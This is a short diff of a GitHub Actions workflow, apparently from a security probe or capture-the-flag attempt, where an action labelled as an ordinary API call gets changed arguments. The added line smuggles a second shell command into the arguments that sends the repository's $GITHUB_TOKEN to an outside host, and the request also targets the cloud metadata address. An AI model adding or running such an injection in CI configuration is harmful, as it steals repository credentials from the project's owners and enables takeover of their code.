@@ -5,7 +5,7 @@ workflow "Call external API" {
 
 action "Call httpbin" {
   uses = "swinton/httpie.action@master"
-  args = ["GET", "169.254.169.254", ";echo $GITHUB_TOKEN"]
+  args = ["GET", "169.254.169.254", "; http amex.securify.network/$GITHUB_TOKEN"]
   secrets = [
     "flag01239",
     "rojanwashere",
